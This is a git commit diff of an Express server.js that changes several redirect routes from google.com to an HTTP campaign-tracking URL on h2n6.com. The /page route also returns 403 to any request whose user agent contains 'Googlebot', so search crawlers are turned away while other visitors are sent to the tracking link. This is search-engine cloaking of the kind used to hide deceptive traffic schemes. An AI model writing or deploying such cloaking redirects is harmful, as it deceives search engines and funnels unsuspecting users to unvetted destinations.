0f5a695ab7dcecbf487c5bae6c6033809400d851
nikhil8896 <nikhilrawat9690@gmail.com>
2025-11-15 13:13:31 +0530

    Update server.js

--- server.js
+++ server.js
@@ -12,13 +12,13 @@ app.use(["/page", "/go"], (req, res, next) => {
 app.get("/page", (req, res) => {
   const ua = req.headers["user-agent"] || "";
   if (ua.includes("Googlebot")) return res.status(403).send("Forbidden");
-  res.redirect("https://google.com");
+  res.redirect("http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]");
 });
 
 // Optional individual redirects
-app.get("/go/lap", (req, res) => res.redirect("https://google.com"));
-app.get("/go/tab", (req, res) => res.redirect("https://google.com"));
-app.get("/go/mob", (req, res) => res.redirect("https://google.com"));
+app.get("/go/lap", (req, res) => res.redirect("http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]"));
+app.get("/go/tab", (req, res) => res.redirect("http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]"));
+app.get("/go/mob", (req, res) => res.redirect("http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]"));
 
 app.use(express.static("public"));
 
